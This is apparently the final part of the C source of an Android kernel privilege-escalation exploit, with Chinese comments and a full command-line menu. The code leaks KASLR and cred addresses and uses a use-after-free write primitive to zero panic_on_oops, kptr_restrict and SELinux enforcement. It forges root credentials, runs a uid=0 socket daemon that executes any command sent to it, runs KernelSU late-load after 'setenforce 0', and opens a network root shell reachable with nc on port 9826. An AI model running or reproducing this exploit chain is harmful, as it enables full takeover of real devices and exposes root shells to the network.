 * 这里保留等价语义与外部可观察行为，但把守护实现压缩成骨架：
 *   rootd    : uid=0 的 unix socket 命令通道（原项目另有 stop 文件/SIGTERM
 *              三重停机通道，KSU late-load 会把 SELinux 推回 Enforcing）
 *   ksu      : 生成 late-load 脚本，经 rootd 以 uid=0 执行 ksud
 *   netshell : TCP 监听，打印设备 IP + 端口，nc 连上即 root shell
 * ========================================================================== */
#define ROOT_SOCK "/data/local/tmp/ghostkey-root.sock"

/* 以「已提权的正规 cred」执行一条命令：独立版直接用 fork/exec，
 * 语义等价于原项目经 rootd socket 下发的 `su -c <cmd>`。 */
static int root_exec(const char *cmd)
{
    pid_t pid = fork();
    int st = 0;
    if (pid < 0) return -1;
    if (pid == 0) {
        setpgid(0, 0);
        execl("/system/bin/sh", "sh", "-c", cmd, (char *)NULL);
        _exit(127);
    }
    waitpid(pid, &st, 0);
    return WIFEXITED(st) ? WEXITSTATUS(st) : -1;
}

static void run_rootd(void)
{
    int srv = socket(AF_UNIX, SOCK_STREAM | SOCK_CLOEXEC, 0);
    struct sockaddr_un addr;
    if (srv < 0) return;
    memset(&addr, 0, sizeof(addr));
    addr.sun_family = AF_UNIX;
    snprintf(addr.sun_path, sizeof(addr.sun_path), "%s", ROOT_SOCK);
    unlink(ROOT_SOCK);
    if (bind(srv, (struct sockaddr *)&addr, sizeof(addr)) || listen(srv, 8)) {
        close(srv); return;
    }
    dprintf(STDOUT_FILENO, "C98260_ROOTD_READY=1\n");
    for (;;) {
        char cmd[4096];
        int fd = accept4(srv, NULL, NULL, SOCK_CLOEXEC);
        ssize_t n;
        if (fd < 0) { if (errno == EINTR) continue; break; }
        n = read(fd, cmd, sizeof(cmd) - 1);
        if (n > 0) { cmd[n] = 0; root_exec(cmd); }
        close(fd);
    }
    close(srv);
    unlink(ROOT_SOCK);
}

static void derive_kmi(char *out, size_t cap)
{
    struct utsname u;
    const char *p;
    if (uname(&u)) { snprintf(out, cap, "android15-6.6"); return; }
    p = strstr(u.release, "android");
    if (p) snprintf(out, cap, "%.31s", p);
    else snprintf(out, cap, "%.31s", u.release);
}

static int stage_f_ksu_late_load(void)
{
    char kmi[64], script[256], cmd[512];
    const char *ksud = "/data/local/tmp/ksud";
    FILE *f;
    derive_kmi(kmi, sizeof(kmi));
    snprintf(script, sizeof(script), "/data/local/tmp/ghostkey_ksu_takeover.sh");
    f = fopen(script, "w");
    if (!f) return -1;
    fprintf(f, "#!/system/bin/sh\n");
    fprintf(f, "# 由 rootd(uid=0) 执行；late-load 必须以 uid=0 运行，shell(2000) 无效\n");
    fprintf(f, "KSUD='%s'; KMI='%s'\n", ksud, kmi);
    fprintf(f, "live() { sleep 1; grep -qi kernelsu /proc/modules && echo yes || echo no; }\n");
    fprintf(f, "[ \"$(live)\" = yes ] && exit 0\n");
    fprintf(f, "setenforce 0 2>/dev/null\n");
    fprintf(f, "chmod 755 \"$KSUD\" 2>/dev/null\n");
    fprintf(f, "\"$KSUD\" late-load --kmi \"$KMI\"\n");
    fprintf(f, "[ \"$(live)\" = yes ] && exit 0\n");
    fprintf(f, "\"$KSUD\" late-load\n");
    fprintf(f, "echo \"[ksu] live=$(live)\"\n");
    fclose(f);
    snprintf(cmd, sizeof(cmd), "sh %s", script);
    STAGE_LOG("late-load KMI=%s（经 uid=0 通道）", kmi);
    return root_exec(cmd);
}

/* 自实现 TCP root shell：Android toybox nc 通常没有 -e，不能依赖系统 nc */
static int print_device_ips(char *first, size_t cap)
{
    struct ifaddrs *list = NULL, *it;
    int n = 0;
    if (getifaddrs(&list)) return 0;
    for (it = list; it; it = it->ifa_next) {
        char buf[INET_ADDRSTRLEN];
        struct sockaddr_in *sin;
        if (!it->ifa_addr || it->ifa_addr->sa_family != AF_INET) continue;
        if (!(it->ifa_flags & IFF_UP) || (it->ifa_flags & IFF_LOOPBACK)) continue;
        sin = (struct sockaddr_in *)it->ifa_addr;
        if (!inet_ntop(AF_INET, &sin->sin_addr, buf, sizeof(buf))) continue;
        LOG_INFO("[终端] 设备 IP：%s (%s)", buf, it->ifa_name);
        if (!n) snprintf(first, cap, "%s", buf);
        n++;
    }
    freeifaddrs(list);
    return n;
}
static void serve_connection(int fd)
{
    pid_t pid = fork();
    if (pid == 0) {
        dup2(fd, STDIN_FILENO); dup2(fd, STDOUT_FILENO); dup2(fd, STDERR_FILENO);
        if (fd > STDERR_FILENO) close(fd);
        setenv("C98260_NETSHELL_CMD", "sh -i", 1);
        execl("/system/bin/sh", "sh", "-c", getenv("C98260_NETSHELL_CMD"), (char *)NULL);
        _exit(127);
    }
    close(fd);
}
static int stage_g_netshell(void)
{
    int srv = socket(AF_INET, SOCK_STREAM | SOCK_CLOEXEC, 0);
    struct sockaddr_in addr;
    char first_ip[INET_ADDRSTRLEN] = "";
    int reuse = 1, n;
    if (srv < 0) return -1;
    setsockopt(srv, SOL_SOCKET, SO_REUSEADDR, &reuse, sizeof(reuse));
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = htonl(INADDR_ANY);
    addr.sin_port = htons((uint16_t)g_netshell_port);
    if (bind(srv, (struct sockaddr *)&addr, sizeof(addr)) || listen(srv, 8)) {
        close(srv); return -1;
    }
    LOG_OK("[终端] 已监听 0.0.0.0:%d", g_netshell_port);
    n = print_device_ips(first_ip, sizeof(first_ip));
    if (n > 0)
        LOG_OK("[终端] 连接命令：nc %s %d", first_ip, g_netshell_port);
    /* marker：宿主解析用，必须保持纯文本，不着色 */
    dprintf(STDOUT_FILENO,
            "C98260_NETSHELL_READY=1 mode=listen port=%d ip=%s\n",
            g_netshell_port, first_ip[0] ? first_ip : "unknown");
    fflush(stdout);
    signal(SIGPIPE, SIG_IGN);
    signal(SIGCHLD, SIG_IGN);
    for (;;) {
        int fd = accept4(srv, NULL, NULL, SOCK_CLOEXEC);
        if (fd < 0) { if (errno == EINTR) continue; break; }
        serve_connection(fd);
    }
    close(srv);
    return 0;
}

/* ==========================================================================
 * [10] 主流程编排
 * ========================================================================== */
static void print_flow(const char *prog)
{
    fprintf(stderr,
        "用法：%s [选项]\n\n"
        "  画像 / 校准\n"
        "  --profile NAME|PATH      6.1 / 6.6 / HOCON 路径（默认按 uname 匹配）\n"
        "  --set key=0x..           覆盖画像字段，如 --set selinux_link=0x..\n"
        "  --slide 0x..             直接给 KASLR slide，跳过校准 A\n"
        "  --page-offset 0x..       直接给 page_offset，跳过校准 B\n"
        "  --va-bits N              VA_BITS_MIN，默认 39（48 位机器写 48）\n"
        "  --max-slide 0x..         slide 窗口上界，仅定制内核需要\n"
        "  --check-target           只校验写原语目标地址，输出 C98260_TARGET_OK\n"
        "\n"
        "  仅泄露（不 UAF、不提权）\n"
        "  --kaslr-only             只跑校准 A  -> C98260_SLIDE\n"
        "  --lmap-only              跑校准 A+B  -> C98260_PAGE_OFFSET\n"
        "  --cred-only              只探测 cred -> C98260_CRED_ADDR\n"
        "\n"
        "  写零直通车（只写 0，不做别的）\n"
        "  --poke 0x..              绝对地址写 0（kallsyms 里的值直接用）\n"
        "  --poke-link 0x..         链接地址写 0（自动加 --slide）\n"
        "  --poke-kptr              关 kptr_restrict + perf_event_paranoid\n"
        "                           （地址取自 --profile 的 kallsyms）\n"
        "  --poke-panic             关 panic_on_oops（含 panic_timeout）\n"
        "                           （同上；画像缺符号时才回退 6.1.134）\n"
        "  --poke-retry N           每个地址重试次数，默认 3（1..20）\n"
        "\n"
        "  提权 / SELinux\n"
        "  --selinux-only           只关 SELinux，不提权、不起 KSU 和 shell\n"
        "  --skip-selinux-check     不判断当前 enforce，直接写 0\n"
        "  --no-ksu                 跳过 KernelSU late-load\n"
        "  --netshell-port N        nc 端口，默认 9826\n"
        "  --daemon-exit            提权后父进程退出，钉页子进程转守护\n"
        "  --fast                   缩短回填等待\n"
        "\n"
        "  其它\n"
        "  --dump-config            只打印当前画像\n"
        "  -v, -vv, -vvv            日志等级 1/2/3（或 --verbose=N）\n"
        "  --color=auto|always|never 日志着色，默认 auto\n"
        "  -h, --help               本帮助\n", prog);
}

static void dump_profile(void)
{
    /* 画像日志已按需求移除；保留空函数以维持 --dump-config / main 调用点。 */
}

int main(int argc, char **argv)
{
    int have_slide = 0, have_lmap = 0, daemon_exit = 0, dump_only = 0;
    int check_target = 0;
    int profile_explicit = 0;
    uint64_t max_slide_arg = 0;
    unsigned char daemon_cmd = 0xAA;

    /* stdout 重定向到日志文件时默认 4KB 全缓冲，改行缓冲让进度实时可见。 */
    setvbuf(stdout, NULL, _IOLBF, 0);
    /* 快退分支：exec_fn 会 execve("/proc/self/exe", {prog,"--exec-ok"})。
     * 扫全部 argv 而非只看 argv[1]，避免 --exec-ok 出现在其它位置时被
     * 当成未知参数。子进程必须立刻退出，否则会重跑整条利用链、毁掉
     * UAF 竞态窗口。 */
    /* 守墓分支：exec 后本 task 的 timerqueue 已被写原语改坏，退出即 oops。
     * 常驻 + SIGSTOP 让 group_dead 永不成立，清理路径永不执行。 */
    for (int i = 1; i < argc; i++)
        if (!strcmp(argv[i], "--exec-hold")) {
            for (;;)
                raise(SIGSTOP);
        }
    for (int i = 1; i < argc; i++)
        if (!strcmp(argv[i], "--exec-ok")) _exit(0);
    color_init();       /* 按 env/TTY 定颜色，让参数解析期的错误也能带色 */
    {
        const char *ve = getenv("C98260_VERBOSE");
        if (ve && ve[0] >= '0' && ve[0] <= '3' && ve[1] == 0)
            g_verbose = ve[0] - '0';
    }

    P = PROFILE_6_6;   /* 装默认画像，随后可由 --profile / uname 覆盖 */

    for (int i = 1; i < argc; i++) {
        const char *a = argv[i];
        if (!strcmp(a, "-h") || !strcmp(a, "--help") ||
            !strcmp(a, "help") || !strcmp(a, "-?")) {
            print_flow(argv[0]); return 0;
        } else if (!strcmp(a, "--slide") && i + 1 < argc) {
            g_slide = strtoull(argv[++i], NULL, 0); have_slide = 1;
        } else if (!strcmp(a, "--max-slide") && i + 1 < argc) {
            max_slide_arg = strtoull(argv[++i], NULL, 0);
        } else if (!strcmp(a, "--va-bits") && i + 1 < argc) {
            g_va_bits = strtoull(argv[++i], NULL, 0);
        } else if (!strcmp(a, "--check-target")) {
            check_target = 1;
        } else if (!strcmp(a, "--page-offset") && i + 1 < argc) {
            P.page_offset = strtoull(argv[++i], NULL, 0); have_lmap = 1;
        } else if (!strcmp(a, "--set") && i + 1 < argc) {
            if (profile_set(argv[++i])) {
                elog("未知画像字段：%s", argv[i]); return 1;
            }
        } else if (!strcmp(a, "--profile") && i + 1 < argc) {
            if (profile_select(argv[++i])) return 1;
            profile_explicit = 1;
        } else if (!strcmp(a, "--kaslr-only"))     g_kaslr_only = 1;
        else if (!strcmp(a, "--lmap-only"))        g_lmap_only = 1;
        else if (!strcmp(a, "--cred-only"))        g_cred_only = 1;
        else if (!strcmp(a, "--poke") && i + 1 < argc) {
            if (poke_add(strtoull(argv[++i], NULL, 0), POKE_ABS, "自定义绝对地址")) {
                elog("--poke 最多 %d 个", MAX_POKES); return 1;
            }
        } else if (!strcmp(a, "--poke-link") && i + 1 < argc) {
            if (poke_add(strtoull(argv[++i], NULL, 0), POKE_LINK, "自定义链接地址")) {
                elog("--poke 最多 %d 个", MAX_POKES); return 1;
            }
        } else if (!strcmp(a, "--poke-kptr")) {
            /* 两道门一起开：kptr_restrict 和 perf_event_paranoid。
             * 地址来自 --profile 装载的画像（boot.img 里 kallsyms 的链接地址），
             * 所以这里只记符号，不改地址——参数顺序里 --profile 可能还在后面。
             * paranoid 写它所在的 8 字节槽：低 3 位清零后前 4 字节是
             * unprivileged_bpf_disabled，一起清掉都是放宽方向。 */
            if (poke_add(0, POKE_SYM_KPTR, "kptr_restrict") ||
                poke_add(0, POKE_SYM_PARANOID, "perf_paranoid+bpf")) {
                elog("--poke 最多 %d 个", MAX_POKES); return 1;
            }
        } else if (!strcmp(a, "--poke-panic")) {
            if (poke_add(0, POKE_SYM_PANIC, "panic_on_oops")) {
                elog("--poke 最多 %d 个", MAX_POKES); return 1;
            }
        } else if (!strcmp(a, "--poke-retry") && i + 1 < argc) {
            g_poke_retry = atoi(argv[++i]);
            if (g_poke_retry < 1)  g_poke_retry = 1;
            if (g_poke_retry > 20) g_poke_retry = 20;
        }
        else if (!strcmp(a, "--selinux-only"))     g_selinux_only = 1;
        else if (!strcmp(a, "--skip-selinux-check") ||
                 !strcmp(a, "--no-selinux-check") ||
                 !strcmp(a, "--force-selinux-zero")) g_skip_selinux_check = 1;
        else if (!strcmp(a, "--no-ksu"))           g_no_ksu = 1;
        else if (!strcmp(a, "--fast"))            g_fast = 1;
        else if (!strcmp(a, "--daemon-exit"))     daemon_exit = 1;
        else if (!strcmp(a, "--dump-config"))     dump_only = 1;
        else if (!strcmp(a, "-v") || !strcmp(a, "--verbose")) {
            if (g_verbose < 3) g_verbose++;
        } else if (!strncmp(a, "--verbose=", 10)) {
            const char *v = a + 10;
            if (strlen(v) != 1 || v[0] < '0' || v[0] > '3') {
                elog("--verbose 只接受 0..3"); return 1;
            }
            g_verbose = v[0] - '0';
        } else if (a[0] == '-' && a[1] == 'v' && a[2] &&
                   strspn(a + 1, "v") == strlen(a) - 1) {
            g_verbose += (int)strlen(a) - 1;   /* -vv / -vvv */
            if (g_verbose > 3) g_verbose = 3;
        } else if (!strncmp(a, "--color=", 8)) {
            const char *v = a + 8;
            if      (!strcmp(v, "always")) g_color_mode = 1;
            else if (!strcmp(v, "never"))  g_color_mode = 2;
            else if (!strcmp(v, "auto"))   g_color_mode = 0;
            else { elog("--color 只接受 auto|always|never"); return 1; }
            color_apply();      /* 命令行覆盖 env，立即重算 g_color */
        }
        else if (!strcmp(a, "--netshell-port") && i + 1 < argc)
            g_netshell_port = atoi(argv[++i]);
        else {
            /* 关键修正：未知参数绝不能静默忽略。旧版 -h 就是被这样吞掉，
             * 结果直接把整条利用链跑起来了。现在一律报错 + 打印用法退出。 */
            elog("未知参数：%s", a);
            fprintf(stderr, "\n");
            print_flow(argv[0]);
            return 1;
        }
    }
    if (getenv("C98260_SELINUX_ONLY")) g_selinux_only = 1;
    if (getenv("C98260_SKIP_SELINUX_CHECK")) g_skip_selinux_check = 1;
    if (getenv("C98260_CRED_ONLY")) g_cred_only = 1;
    if (getenv("PLANT_FAST")) g_fast = 1;

    /* 窗口按公式重算；显式覆盖只认上界。
     * --slide 手工给了窗口外的值时也放开，否则 --check-target 会自相矛盾：
     * 用户明确指定了 slide，目标地址却因为「不在公式窗口」被拒。 */
    kaslr_window_init();
    if (max_slide_arg) {
        g_slide_max = max_slide_arg;
        g_slide_max_user = 1;
    } else if (have_slide && g_slide > g_slide_max) {
        g_slide_max = g_slide;
        g_slide_max_user = 1;
    }
    LOG_V1("[kaslr] VA_BITS=%" PRIu64 " 公式窗口=[%#" PRIx64 ", %#" PRIx64
           "]%s", g_va_bits, g_slide_min, g_slide_max,
           g_slide_max_user ? "（显式覆盖：只校验上界，不再卡公式下界）" : "");

    /* 两个仅泄露模式互斥；「实际泄露」不能与「直接给值」并用。
     * --lmap-only 允许配 --slide：校准 B 要用 timer_link+slide 过滤
     * call_site，先给 slide 就能省掉一轮校准 A。排在画像自动选择之前，
     * 让参数错误成为第一条输出。 */
    if (g_kaslr_only && g_lmap_only) {
        elog("--kaslr-only 与 --lmap-only 只能选一个"); return 1;
    }
    /* 三个 only 都是「单步即退出」，同时给两个会让退出点互相盖掉，
     * 输出的 marker 也就无法判断到底走了哪条。 */
    if (g_cred_only && (g_kaslr_only || g_lmap_only)) {
        elog("--cred-only 不能与 --kaslr-only / --lmap-only 并用"); return 1;
    }
    if (g_cred_only && g_selinux_only) {
        elog("--cred-only 与 --selinux-only 只能选一个"); return 1;
    }
    /* cred 的 call_site 匹配要用 slide（cred_link + slide），所以允许
     * --slide 跳过校准 A；给了就省一轮 timer 风暴。 */
    if (g_kaslr_only && have_slide) {
        elog("--kaslr-only 用于实际泄露 slide，不能与 --slide 并用");
        return 1;
    }
    if (g_lmap_only && have_lmap) {
        elog("--lmap-only 用于实际泄露 page_offset，"
             "不能与 --page-offset 并用");
        return 1;
    }
    /* poke 是独立终点（写完即退），与其它单步模式互斥 */
    if (g_npoke && (g_kaslr_only || g_lmap_only || g_cred_only || g_selinux_only)) {
        elog("--poke/--poke-kptr/--poke-panic 不能与 "
             "--kaslr-only/--lmap-only/--cred-only/--selinux-only 并用");
        return 1;
    }

    LOG_V1("[verbose] 等级=%d（-v 调试 / -vv 详细 / -vvv 逐条）", g_verbose);
    LOG_V3("[verbose] 逐条模式：tracefs 成功写入与 order=1 原始样本行逐条打印");
    if (!profile_explicit) profile_auto_select();

    if (dump_only) { dump_profile(); return 0; }

    /* 不触发 UAF 的自检：只算 target 并判断是否在合理 KASLR 范围内。
     * 用于把「校准 A 解出荒谬 slide」这类隐患在真机注入前挡下来。 */
    if (check_target) {
        uint64_t sel = slide_addr(P.selinux_link) - 7;
        int ok = selinux_target_ok(sel);
        LOG_CFG("[check] selinux_link=%#" PRIx64 " slide=%#" PRIx64
                " target=%#" PRIx64 " 公式窗口=[%#" PRIx64 ", %#" PRIx64 "]",
                P.selinux_link, g_slide, sel, g_slide_min, g_slide_max);
        if (ok) LOG_OK("[check] 目标地址在合理范围内");
        else    LOG_WARN("[check] 目标地址越界：拒绝注入，请核对 profile/slide");
        dprintf(STDOUT_FILENO, "C98260_TARGET_OK=%d\n", ok ? 1 : 0);
        return ok ? 0 : 9;
    }

    timing_start();   /* 从此刻计全程；帮助 / 画像转储 / 参数错误不计时 */

    log_sync();
    /* 单独一行、只在启用时打印：默认输出必须与旧版逐字节一致 */
    if (g_skip_selinux_check)
        LOG_DIM("[mode] skip_selinux_check=1：不读 enforce、不回读确认，直接写原语清零");
    verbose_env_probe();
    dump_profile();
    /* 仅泄露模式不碰 SELinux 前置检查，避免日志里出现无关的 errno=13；
     * --skip-selinux-check 连这一处前置读也一起跳过。 */
    if (!g_kaslr_only && !g_lmap_only && !g_cred_only && !g_skip_selinux_check)
        (void)read_enforce_is_permissive();

    ipc = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
               MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    if (ipc == MAP_FAILED) return finish(1);
    memset(ipc, 0, sizeof(*ipc));
    if (pin_cpu(0)) return finish(1);
    set_buffer_kb(16384);   /* 回读真实值，后面的 timer 数量按它裁剪 */

    /* [1] 校准 A：--slide 直接给值时标 skipped，避免误以为真的泄露过一次 */
    if (have_slide) {
        g_slide_known = 1;
        emit_status("calib_a", "skipped");
        stage_skipped("校准 A (KASLR slide)");
    } else {
        emit_status("calib_a", "running");
        stage_begin();
        if (stage_a_calibrate_slide()) {
            emit_status("calib_a", "failed");
            stage_done("校准 A (KASLR slide)", "失败");
            elog("[calib_a] 失败：无法解出 KASLR slide");
            /* marker：宿主解析用，必须保持纯文本，不着色 */
            if (g_kaslr_only) dprintf(STDOUT_FILENO, "C98260_KASLR_ONLY_DONE=0\n");
            if (g_lmap_only)  dprintf(STDOUT_FILENO, "C98260_LMAP_ONLY_DONE=0\n");
            if (!g_cred_only) {
                disarm_all();
                return finish(2);
            }
            /* cred-only 例外：cred_link 匹配不到就退回按 cred_size 弱匹配，
             * 不需要 slide。弱匹配会被同尺寸 slab 带偏，结果只作调试参考。 */
            LOG_WARN("[cred] 没有 slide，改按 cred_size=%u 弱匹配；"
                     "同尺寸分配较多时结果可能不是 cred", P.cred_size);
            disarm_all();
        } else {
            g_slide_known = 1;
            emit_status("calib_a", "ok");
            stage_done("校准 A (KASLR slide)", NULL);
        }
    }
    if (g_slide) LOG_LEAK("[slide] %#" PRIx64, g_slide);
    else         LOG_WARN("[slide] 0（校准 A 未成功，后续按无 slide 处理）");

    /* ---- only #1：仅泄露 KASLR slide -------------------------------------
     * stage_a 已打印 C98260_SLIDE=0x.. 并自行 disarm_kmem_cache_alloc()。
     * 这里到此为止：不跑校准 B、不 setsid、不 leak_task / UAF / 提权 /
     * KSU / netshell，也不 fork 任何常驻进程，退出后不留痕。 */
    if (g_kaslr_only) {
        disarm_all();
        LOG_LEAK("[leak] 仅泄露 KASLR slide：%#" PRIx64, g_slide);
        LOG_LEAK("[leak] 本次启动 _text ≈ %#" PRIx64,
                 UINT64_C(0xffffffc008000000) + g_slide);
        LOG_OK("[leak] 完整利用时可用：--slide %#" PRIx64, g_slide);
        /* marker：宿主解析用，必须保持纯文本，不着色 */
        dprintf(STDOUT_FILENO, "C98260_KASLR_ONLY_DONE=1\n");
        return finish(0);
    }

    /* ---- only #3：仅探测 cred 分配地址 -----------------------------------
     * 与 --kaslr-only 同一层：只要 A 的 slide 去匹配 call_site
     * （needle = cred_link + slide），拿到本次启动里一次 prepare_creds()
     * 分配的 struct cred 内核虚拟地址就退出。不跑 B、不 setsid、不
     * leak_task、不 UAF、不碰 SELinux，退出前杀掉 capset 触发子进程。
     *
     * 语义边界：这是「观察到内核刚分配的那个 cred」，不是
     * current->cred。后者要读 task_struct->cred 字段，需要任意读原语，
     * 本链只有写原语，拿不到。 */
    if (g_cred_only) {
        uint64_t cred = 0;
        int rc = -1;
        disarm_all();
        emit_status("cred", "running");
        stage_begin();
        if (cred_child_ensure()) {
            emit_status("cred", "failed");
            elog("[cred] 无法建立 capset 触发子进程");
            dprintf(STDOUT_FILENO, "C98260_CRED_ONLY_DONE=0\n");
            return finish(4);
        }
        /* capset 的分配记录偶尔撞上环被覆盖或事件刚启用，重试几轮成本很低 */
        for (int i = 0; i < 3 && rc; i++) {
            if (i) {
                struct timespec nap = { .tv_sec = 0, .tv_nsec = 200000000L };
                nanosleep(&nap, NULL);
            }
            rc = leak_cred_addr(&cred);
            if (rc) LOG_WARN("[cred] 第 %d 轮未取到样本，重试", i + 1);
        }
        disarm_all();
        cred_child_reap();
        if (rc) {
            emit_status("cred", "failed");
            stage_done("cred 地址探测", "失败");
            elog("[cred] 三轮都没取到可用样本：先确认 tracefs 可写，"
                 "再核对画像的 cred_link / cred_size");
            dprintf(STDOUT_FILENO, "C98260_CRED_ONLY_DONE=0\n");
            return finish(4);
        }
        emit_status("cred", "ok");
        stage_done("cred 地址探测", NULL);
        LOG_LEAK("[cred] 分配地址=%#" PRIx64, cred);
        LOG_DIM("[cred] 这是 prepare_creds() 的一次新分配，不是 current->cred");
        /* slab 只会落在 linear map 里。落在外面的几乎一定是 by_size 弱匹配
         * 抓到的同尺寸对象（176/184 字节的 slab 不止 cred 一家）。 */
        if (P.page_offset &&
            (cred < P.page_offset || cred - P.page_offset >= (UINT64_C(1) << 38)))
            LOG_WARN("[cred] %#" PRIx64 " 不在 linear map [%#" PRIx64
                     ", +256G) 内，很可能是弱匹配的假阳性，不要当真实 cred 用",
                     cred, P.page_offset);
        /* marker：宿主解析用，必须保持纯文本，不着色 */
        dprintf(STDOUT_FILENO, "C98260_CRED_ADDR=%#" PRIx64 "\n", cred);
        dprintf(STDOUT_FILENO, "C98260_CRED_ONLY_DONE=1\n");
        return finish(0);
    }

    /* [2] 校准 B（失败只降级，用画像默认值，不中止） */
    int b_rc = 0;
    if (have_lmap) {
        emit_status("calib_b", "skipped");
        stage_skipped("校准 B (page_offset)");
    } else {
        emit_status("calib_b", "running");
        stage_begin();
        b_rc = stage_b_calibrate_lmap();
        emit_status("calib_b", b_rc ? "degraded" : "ok");
        stage_done("校准 B (page_offset)", b_rc ? "未命中，降级" : NULL);
    }

    /* ---- only #2：仅泄露 page_offset（线性映射基址）---------------------
     * stage_b 已打印 C98260_PAGE_OFFSET=0x.. 并自行 disarm_all()。
     * 注意 B 依赖 A 的 slide（site_link = timer_link + g_slide），所以本模式
     * 会先跑 A；若命令行已给 --slide 则跳过 A 直接跑 B。 */
    if (g_lmap_only) {
        disarm_all();
        if (b_rc)
            LOG_WARN("[leak] page_offset=%#" PRIx64 "（校准 B 未命中，"
                     "退回画像默认值，非实测，勿用于完整利用）", P.page_offset);
        else
            LOG_LEAK("[leak] page_offset=%#" PRIx64 "（实测）", P.page_offset);
        /* 只有实测命中才给可复制的命令行片段，避免把兜底默认值当结果 */
        if (!b_rc)
            LOG_OK("[leak] 完整利用时可用：--slide %#" PRIx64
                   " --page-offset %#" PRIx64, g_slide, P.page_offset);
        /* marker：宿主解析用，必须保持纯文本，不着色 */
        dprintf(STDOUT_FILENO, "C98260_LMAP_ONLY_DONE=%d\n", b_rc ? 0 : 1);
        return finish(b_rc ? 3 : 0);  /* 无基址命中时只退回画像默认值，不算成功 */
    }

    /* ---- 写零直通车：--poke ---------------------------------------------
     * 到这里 slide / page_offset 都已就位（实测或命令行给），只差写。
     * 不 setsid、不 leak_task、不碰 SELinux、不提权；写完就退。
     * 守墓进程留在 T 态被 init 收养——树已脏，收尸必 oops。 */
    if (g_npoke) {
        disarm_all();
        emit_status("poke", "running");
        stage_begin();
        int prc = run_pokes();
        stage_done("poke 写零", prc ? "有地址未命中" : NULL);
        emit_status("poke", prc ? "failed" : "ok");
        return finish(prc ? 6 : 0);
    }

    /* 脱离宿主会话：UserService 解绑/退出时本进程与 rootd 要继续活着 */
    (void)setsid();
    emit_status("inject", "running");

    /* [2.5] 先关 panic_on_oops：写原语直接清 .data，不依赖 root / SELinux。
     * 放在 stage_c 之前，后续 oops 只杀当前 task，不会整机 panic。 */
    stage_begin();
    defuse_panic();
    stage_done("关 panic_on_oops", g_panic_defused ? NULL : "写原语未命中");

    /* [3] 泄漏 task_struct；selinux-only 模式不需要它，也不留常驻进程 */
    if (!g_selinux_only) {
        stage_begin();
        if (stage_c_leak_task()) {
            LOG_ERR("[task] 地址泄漏失败");
            stage_done("leak_task (地址泄漏/钉页)", "失败");
            disarm_all(); emit_status("inject", "failed"); return finish(5);
        }
        stage_done("leak_task (地址泄漏/钉页)", NULL);
    } else {
        stage_skipped("leak_task (地址泄漏/钉页)");
    }

    /* [4..7] 关闭 SELinux ->（可选）伪造 cred 提权 */
    g_plant_cred = 0;
    {
        stage_begin();
        int rc = stage_d_disable_selinux();
        if (rc == -2) {          /* 写前闸判定地址不可信：继续只会写坏内核 */
            stage_done("UAF 注入 + 关闭 SELinux", "目标地址越界，中止");
            emit_status("inject", "failed");
            return finish(9);
        }
        if (g_selinux_only) {
            stage_done("UAF 注入 + 关闭 SELinux", rc ? "失败" : NULL);
            emit_status("inject", rc == 0 ? "ok" : "failed");
            return finish(rc == 0 ? 0 : 7);
        }
        stage_done("UAF 注入 + 关闭 SELinux", NULL);
    }
    stage_begin();
    /*
     * 必须检查返回值。之前的写法丢掉了它：cred 12 轮全失败后照样
     * 打 "verify:ok"、报 "su -c id => uid=0(root)"、起 nc，最后 id
     * 一敲却是 uid=2000(shell)，把失败伪装成成功。
     * 现在走的是写 0 路径（parent == NULL），失败退出不会再引 panic，
     * 所以直接收工，不必像伪造 cred 那样 pause() 钉页。
     */
    int cred_rc = stage_e_escalate_cred();
    if (cred_rc) {
        stage_done("伪造 cred 提权", "失败");
        emit_status("inject", "failed");
        LOG_WARN("[inject] uid 未清零，提权失败，跳过 rootd/KernelSU/nc");
        log_sync();
        return finish(8);
    }
    stage_done("伪造 cred 提权", NULL);
    emit_status("inject", "ok");

    /* [8] 提权后：先给出 root 通道，再（可选）接管 KernelSU，最后开放 nc */
    emit_status("verify", "ok");
    if (!g_no_ksu) {
        emit_status("ksu", "running");
        stage_begin();
        int rc = stage_f_ksu_late_load();
        emit_status("ksu", rc == 0 ? "ok" : "failed");
        stage_done("KernelSU late-load", rc ? "失败" : NULL);
    } else {
        emit_status("ksu", "skipped");
        stage_skipped("KernelSU late-load");
    }
    LOG_OK("[终端] 网络终端已开放｜端口 %d", g_netshell_port);
    if (fork() == 0) { setsid(); _exit(stage_g_netshell()); }

    /* [9] 退场 */
    if (daemon_exit) {
        if (write(g_wake[1], &daemon_cmd, 1) == 1) {
            char ack[32];
            ssize_t got = read(g_report[0], ack, sizeof(ack) - 1);
            if (got > 0) { ack[got] = 0; LOG_INFO("[cred] 子进程应答：%s", ack); }
            close(g_wake[1]); close(g_report[0]);
            LOG_INFO("[cred] 主进程退出，子进程转为守护并钉住页面");
            return finish(0);
        }
        LOG_ERR("[cred] 发送守护指令失败");
    }
    /* 无 --daemon-exit：驻留等待钉页子进程（参考实现行为）。
     * 绝不 SIGKILL 它：它还引用着伪造 cred，强杀会让内核踩空 panic。 */
    for (;;) {
        int status = 0;
        pid_t done = waitpid(g_cred_child_pid, &status, WNOHANG);
        if (done == g_cred_child_pid) {
            LOG_INFO("[cred] 子进程已退出 (status=%d)，释放页面", status);
            break;
        }
        {
            struct timespec nap = { .tv_sec = 0, .tv_nsec = 200000000L };
            nanosleep(&nap, NULL);
        }
    }
    close_stream();
    LOG_OK("[uaf] 利用完成，正在正常退出");
    return finish(0);
}
